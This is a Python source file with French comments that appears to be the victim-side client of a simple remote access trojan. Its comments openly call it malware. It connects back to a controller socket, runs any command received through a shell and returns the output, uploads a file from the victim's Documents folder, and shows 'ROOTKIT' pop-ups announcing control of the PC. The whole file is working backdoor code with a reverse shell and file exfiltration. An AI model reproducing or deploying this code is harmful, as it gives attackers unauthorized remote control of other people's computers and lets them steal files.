### - IMPORTATIONS

import os
import socket
import subprocess
from time import sleep
import ctypes

import json
from urllib import request
import time
import tkinter as tk
from tkinter import messagebox



### - VARIABLES


### - FONCTIONS
class Client:
    def __init__(self, DATA):
        self.DATA = DATA

    def verifications(DATA):
        #Exécute les commandes
        if(DATA == str.encode("command")):
            command = s.recv(1024)
            Client.command(command.decode("latin1"))

        #Shell : Pour avoir accès à la shell de la victime
        if(DATA == str.encode("home")):
            s.send(os.getcwd().encode())

        #Exit : Pour arrêter le malware coté victime 
        if(DATA == str.encode("exit")):
            s.close()
            exit()
        #Popupclient : Affiche une pop up chez le client.
        if(DATA == str.encode("popup")):
            Client.popupclient(DATA)

        #Recv archive : Pour télécharger des fichiers depuis la victime.
        if(DATA == str.encode("filesend")):
            Client.send_archive(DATA)

        #Recv Archive Client
    def send_archive(DATA):
        file = r"C:\Users\ADM_VM01\Documents\test.txt"
        filetosend = open(file, "rb")
        #Envoi des données
        data = filetosend.read(1024)
        print("Sending...")
        print(data)
        s.send(data)
        filetosend.close()
        s.send(b"DONE")
        print("Done Sending.")
        print(s.recv(1024))
        s.shutdown(2)
        s.close()

        #Popupclient client
    def popupclient(DATA):
        for i in range (5):
            messagebox.showerror("R O O T K I T", "J'ai le contrôle de votre PC")

    def command(DATA):
        sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = sub.stderr.read()+sub.stdout.read()
        s.send(output)

######################--TRAITEMENT--######################

IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))
s.send("\n".encode("latin1"))
s.send("Connexion établie avec le client.".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("Commandes possibles : shell, exit, recv_archive, help, popup".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("CTRL+C pour exit le shell".encode("latin1"))
s.send("\n".encode("latin1"))


while True:
    try:
        rcvc = s.recv(1024)
        Client.verifications(rcvc)
    except KeyboardInterrupt:
        s.close()
        exit()